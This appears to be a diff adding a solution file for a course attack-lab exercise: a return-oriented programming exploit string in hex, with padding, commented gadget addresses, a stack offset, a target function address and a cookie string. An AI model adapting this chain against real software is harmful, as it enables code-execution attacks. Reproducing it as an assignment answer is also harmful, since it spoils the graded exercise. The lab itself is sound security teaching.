@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00 // buffer
+00 00 00 00 00 00 00 00 // buffer
+00 00 00 00 00 00 00 00 // buffer
+a0 17 40 00 00 00 00 00 // movq %rsp, %rax
+13 17 40 00 00 00 00 00 // movq %rax, %rdi
+f0 16 40 00 00 00 00 00 // pop %rax (and some nop)
+48 00 00 00 00 00 00 00 // 0x48 bytes or 72 bytes (the value to be added to %rsp)
+99 17 40 00 00 00 00 00 // movl %eax, %ecx (and one nop)
+30 17 40 00 00 00 00 00 // movl %ecx, %edx ; cmpb %dl, %dl
+d4 17 40 00 00 00 00 00 // movl %edx, %esi ; cmpb %bl, %bl
+23 17 40 00 00 00 00 00 // lea (%rdi,%rsi,1),%rax
+13 17 40 00 00 00 00 00 // movq %rax, %rdi
+45 16 40 00 00 00 00 00 // touch3's address
+33 63 31 65 66 66 34 35 // cookie string
